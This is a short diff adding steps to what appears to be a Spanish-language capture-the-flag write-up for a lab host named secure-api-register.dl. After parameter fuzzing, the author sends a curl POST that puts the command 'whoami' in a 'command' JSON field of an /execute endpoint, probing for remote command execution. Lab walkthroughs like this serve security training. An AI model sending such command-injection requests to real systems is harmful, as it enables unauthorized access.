@@ -295,6 +295,20 @@ chmod +x param_fuzz.sh
 ./param_fuzz.sh
 ```
 
+Obtenemos esta respuesta
+
+![image](https://github.com/user-attachments/assets/9216bcc5-5250-4c68-9228-d62d3d7813d9)
+
+Donde podemos ver que el parametro command nos retorna una respuesta siendo asi ejecutamos el comando Curl nuevamente con el parametro command
+
+```bash
+curl -X POST http://secure-api-register.dl/execute \
+  -H "Content-Type: application/json" \
+  -d '{"command": "whoami"}' \
+  -b cookie.txt
+```
+
+
 
 
 
